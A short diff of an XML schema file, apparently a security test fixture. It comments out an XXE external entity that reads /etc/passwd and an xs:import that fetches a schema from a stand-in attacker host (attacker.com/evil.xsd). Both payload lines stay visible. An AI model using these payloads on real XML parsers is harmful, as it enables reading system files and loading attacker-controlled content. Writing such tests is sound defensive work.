@@ -1,9 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
+<!-- <!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
+  
+<!DOCTYPE xs:schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "">  
+-->
 <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
-  <xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/>
+  <!-- <xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/> -->
   <xs:element name="note">
     <xs:complexType>
       <xs:sequence>
